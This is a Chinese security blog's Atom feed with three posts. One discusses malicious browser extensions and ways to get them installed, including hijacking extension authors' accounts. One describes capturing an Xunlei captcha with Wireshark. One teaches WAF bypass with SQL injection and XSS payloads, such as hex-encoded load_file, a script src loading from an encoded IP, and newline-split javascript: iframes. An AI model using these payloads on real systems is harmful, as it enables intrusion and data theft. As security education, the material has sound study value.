class=&quot;params&quot;&gt;ip&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(ip)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;webrtcxss.getIp();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。&lt;/p&gt;
&lt;h4 id=&quot;0x4-结言：&quot;&gt;&lt;a href=&quot;#0x4-结言：&quot; class=&quot;headerlink&quot; title=&quot;0x4 结言：&quot;&gt;&lt;/a&gt;0x4 结言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog：&lt;a href=&quot;http://bugs.cc&quot;&gt;http://bugs.cc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。&lt;/p&gt;
&lt;h4 id=&quot;0x1-让自己变成攻击者：&quot;&gt;&lt;a href=&quot;#0x1-让自己变成攻击者：&quot; class=&quot;headerlink&quot; title=&quot;0x1 让自己变成攻击者：&quot;&gt;&lt;/a&gt;0x1 让自己变成攻击者：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。&lt;/p&gt;
&lt;p&gt;在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。&lt;/p&gt;
&lt;p&gt;大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&lt;/p&gt;
&lt;p&gt;被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装&lt;/p&gt;
&lt;p&gt;基于社工库控制插件作者的账户，加入后门代码，更新插件&lt;/p&gt;
&lt;p&gt;控制插件里调用的第三方javascript代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在有四种方法供我们选择，我们一个个来进行介绍。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>在debian下如何使用迅雷登陆账号</title>
    <link href="http://bugs.cc/2016/08/24/%E5%9C%A8debian%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BF%85%E9%9B%B7%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7/"/>
    <id>http://bugs.cc/2016/08/24/在debian下如何使用迅雷登陆账号/</id>
    <published>2016-08-24T05:08:47.000Z</published>
    <updated>2016-08-24T06:24:40.734Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;下载迅雷：&quot;&gt;&lt;a href=&quot;#下载迅雷：&quot; class=&quot;headerlink&quot; title=&quot;下载迅雷：&quot;&gt;&lt;/a&gt;下载迅雷：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;可能是我们这边地区的问题，在迅雷官网下载的迅雷都很慢，于是使用“百度管家”下载。&lt;a href=&quot;http://112.29.142.181/sw.bos.baidu.com/sw-search-sp/software/66cfb7c33b400/Thunder_9.0.12.332_baidu.exe&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;fuck me down XunLei&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;环境搭建：&quot;&gt;&lt;a href=&quot;#环境搭建：&quot; class=&quot;headerlink&quot; title=&quot;环境搭建：&quot;&gt;&lt;/a&gt;环境搭建：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;就是用wine来使用exe程序，这里不介绍，请自己百度&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;安装注意事项：&quot;&gt;&lt;a href=&quot;#安装注意事项：&quot; class=&quot;headerlink&quot; title=&quot;安装注意事项：&quot;&gt;&lt;/a&gt;安装注意事项：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;不要使用&lt;code&gt;sudo wine Thunder_9.0.12.332_baidu.exe&lt;/code&gt;，请使用&lt;code&gt;wine Thunder_9.0.12.332_baidu.exe&lt;/code&gt;，不然你的迅雷会被安装到root用户下&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;如何启动&quot;&gt;&lt;a href=&quot;#如何启动&quot; class=&quot;headerlink&quot; title=&quot;如何启动&quot;&gt;&lt;/a&gt;如何启动&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;迅雷安装好后，会在你的桌面放一个快捷方式。如果没有，请像我这么做：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;cd ~/.wine/drive_c/Program\ Files\ \(x86\)/Thunder\ Network/Thunder9/Program/&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;wine Thunder.exe&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然后，他就启动成功了。&lt;/p&gt;
&lt;p&gt;就像这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;为什么会出现黑色的框框呢？&quot;&gt;&lt;a href=&quot;#为什么会出现黑色的框框呢？&quot; class=&quot;headerlink&quot; title=&quot;为什么会出现黑色的框框呢？&quot;&gt;&lt;/a&gt;为什么会出现黑色的框框呢？&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;黑色的框框是个浏览器，迅雷自带的XBrowser浏览器。个人猜测是因为dll的问题，等我有时间的时候，我去找台window电脑，看一下这个浏览器以来上面dll。这个浏览器无所谓的，没有他照样下载。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;登陆&quot;&gt;&lt;a href=&quot;#登陆&quot; class=&quot;headerlink&quot; title=&quot;登陆&quot;&gt;&lt;/a&gt;登陆&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;重点来了，点击登陆时，会让你输入账号密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;但是你会发现，你输入的字符串没有显示，不用慌，就像linux终端输入密码时一样，其实你输入了，只是不可见而已。然后就可以登陆了。但是有时候会出现让你填写验证码的框。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是你会蛋疼的发现，验证码去吃屎了。所以现在我们就来解决这个问题。先想象一下验证码的特性。当我点击“看不清，换一张”的时候，那么一定会发送一个数据包。然后返回新的验证码数据包，我们只需要截取这个数据就行了。这里我使用wireshark来进行抓包。&lt;/p&gt;
&lt;p&gt;debian安装wireshark，需要添加kali的源，然后&lt;code&gt;sudo apt-get update&amp;amp;&amp;amp;sudo apt-get install wireshark&lt;/code&gt;就行了。记得使用&lt;code&gt;sudo wireshark&lt;/code&gt;来运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我这里的网卡是wlan0，有可能不一样，选一个你觉得是对的就行了，如果你还是不知道。对不起，请你出去，本节课不准提问。&lt;/p&gt;
&lt;p&gt;然后你就看到比粪池里的屎还多的数据包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个时候我们在Filter里填写&lt;code&gt;http&amp;amp;&amp;amp; http contains &amp;quot;image/jpeg&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后打开迅雷，登陆。当出现验证码验证的时候再次切换到wireshark看就行了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;选中（就是让它的背景色变成蓝色，单击）&lt;/p&gt;
&lt;p&gt;然后File-&amp;gt;Export Objects-&amp;gt;HTTP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;选中地址是&lt;code&gt;verify2.xunlei.com&lt;/code&gt;且Content Type为&lt;code&gt;image/jpeg&lt;/code&gt;选中后，点击另存为xx.jpg。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;拿验证码登陆就行了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。&lt;br&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>杂谈如何绕过WAF（Web应用防火墙）</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9D%82%E8%B0%88%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87WAF%EF%BC%88Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%89/"/>
    <id>http://bugs.cc/2016/08/20/杂谈如何绕过WAF（Web应用防火墙）/</id>
    <published>2016-08-20T11:04:31.000Z</published>
    <updated>2016-08-23T16:00:58.289Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言：&quot;&gt;&lt;a href=&quot;#0×01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言：&quot;&gt;&lt;/a&gt;0×01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。&lt;/p&gt;
&lt;p&gt;可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;amp;apache等。下面正式开始：）&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x02-直视WAF：&quot;&gt;&lt;a href=&quot;#0x02-直视WAF：&quot; class=&quot;headerlink&quot; title=&quot;0x02 直视WAF：&quot;&gt;&lt;/a&gt;0x02 直视WAF：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;作为第一节，我先为大家简单的说下一些绕过WAF的方法。&lt;/p&gt;
&lt;h4 id=&quot;1、-大小写转换法：&quot;&gt;&lt;a href=&quot;#1、-大小写转换法：&quot; class=&quot;headerlink&quot; title=&quot;1、 大小写转换法：&quot;&gt;&lt;/a&gt;1、 大小写转换法：&lt;/h4&gt;&lt;p&gt;看字面就知道是什么意思了，就是把大写的小写，小写的大写。比如:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：sEleCt vERsIoN();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍XSS：&amp;lt;sCrIpt&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数&lt;/p&gt;
&lt;h4 id=&quot;2、-干扰字符污染法&quot;&gt;&lt;a href=&quot;#2、-干扰字符污染法&quot; class=&quot;headerlink&quot; title=&quot;2、 干扰字符污染法:&quot;&gt;&lt;/a&gt;2、 干扰字符污染法:&lt;/h4&gt;&lt;p&gt;空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如下面的：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：sEleCt+1-1+vERsIoN   /*!*/       ();`yohehe‍‍&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍SQL2：select/*!*/`version`();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XSS：下面一节会仔细的介绍&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;3、字符编码法：&quot;&gt;&lt;a href=&quot;#3、字符编码法：&quot; class=&quot;headerlink&quot; title=&quot;3、字符编码法：&quot;&gt;&lt;/a&gt;3、字符编码法：&lt;/h4&gt;&lt;p&gt;就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL:load_file(0x633A2F77696E646F77732F6D792E696E69)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍‍‍XSS：&amp;lt;script%20src%3D&amp;quot;http%3A%2F%2F0300.0250.0000.0001&amp;quot;&amp;gt;&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf&lt;/p&gt;
&lt;h4 id=&quot;4、拼凑法&quot;&gt;&lt;a href=&quot;#4、拼凑法&quot; class=&quot;headerlink&quot; title=&quot;4、拼凑法&quot;&gt;&lt;/a&gt;4、拼凑法&lt;/h4&gt;&lt;p&gt;如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SQL：selselectect verversionsion();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;‍‍‍‍XSS：&amp;lt;scr&amp;lt;script&amp;gt;rip&amp;gt;alalertert&amp;lt;/scr&amp;lt;/script&amp;gt;rip&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。&lt;/p&gt;
&lt;p&gt;本节是告诉大家，waf总会有自己缺陷的，任何事物都不可能完美。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x03-站在webkit角度来说绕过WAF：&quot;&gt;&lt;a href=&quot;#0x03-站在webkit角度来说绕过WAF：&quot; class=&quot;headerlink&quot; title=&quot;0x03 站在webkit角度来说绕过WAF：&quot;&gt;&lt;/a&gt;0x03 站在webkit角度来说绕过WAF：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;可能这时会有人问到，说绕过WAF，怎么跑到webkit上去了。嗯，你没有看错，我也没有疯。之说以站在webkit角度来讲绕过WAF，是因为各个代码的功能是由浏览器来解析的。那浏览器中谁又负责解析呢？那就是webkit， 既然要说到webkit，那就不得不提webkit下的解析器——词法分析器，因为我们在绕过的时候，就是利用解析器中的词法分析器来完成。&lt;/p&gt;
&lt;p&gt;就比如一个简单的绕过WAF的XSS代码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;java
script:alert(1)&amp;quot; height=0 width=0 /&amp;gt;&amp;lt;iframe&amp;gt; &amp;lt;!--Java和script是回车，al和ert是Tab换行符--&amp;gt;&lt;/code&gt;&lt;br&gt;他可以弹窗，可以为什么他可以弹窗呢？这里面有回车、换行符啊。想要理解，我们来看看webkit下的Source/javascriptcore/parser/lexer.cpp是怎么声明的吧。&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (m_current != stringQuoteCharacter) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (UNLIKELY(m_current ==&lt;span class=&quot;string&quot;&gt;&#39;\\&#39;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stringStart != currentSourcePtr() &amp;amp;&amp;amp; shouldBuildStrings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            append8(stringStart, currentSourcePtr() - stringStart);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LChar escape = singleEscape(m_current);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (escape) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (shouldBuildStrings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                record8(escape);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (UNLIKELY(isLineTerminator(m_current)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            shiftLineTerminator();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意倒数第二行里的isLineTerminator函数。这里我来说说大致的意思：所有的内容都在一个字符串里，用while逐字解析，遇到换行就跳过。然后在拼成一个没有分割符的字符串，所以这时的XSS代码成功弹窗了。&lt;br&gt;Webkit里的词法分析器里除了跳过换行符，还会跳过什么字符呢？&lt;/p&gt;
&lt;p&gt;子曰：还有回车等分隔符。&lt;/p&gt;
&lt;p&gt;根据webkit词法分析器的机制，我们就可以写更多的猥琐xss代码。&lt;/p&gt;
&lt;p&gt;下面再说说这个注意事项：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;java&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;script:alert(1)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!--这个可以弹窗--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;java&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;script:alert&lt;/span&gt;(&lt;span class=&quot;attr&quot;&gt;1&lt;/span&gt;); &lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!--这个不可以弹窗--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为在webkit的词法分析器里，跳过回车、换行等分隔符时有个前提，那就是必须用单/双引号围住，不然不会跳过。因为如果不使用引号，词法分析器会认为 回车、换行就是结束了，如果你运行上面这段代码，webkit会把java当做地址传给src。词法分析器跳过的前提就是建立在引号里的，切记。&lt;br&gt;这里在说一个：&lt;/p&gt;
&lt;p&gt;回车、换行只在属性中引号里才会起作用。如果你对标签或者属性用 回车、换行，这时你大可放心，决对不会弹窗。而且在属性值里 回车、换行随便用。如果空格出现在xss代码里并不会弹窗，但是如果出现在字符和符号之前，就可以弹了。如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;注意事项：&lt;br&gt;跳过回车和换行，不支持on事件。例如下面的代码&lt;br&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;java    script:alert(1)&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/code&gt;会弹窗，但是下面的代码就不行了。&lt;/p&gt;
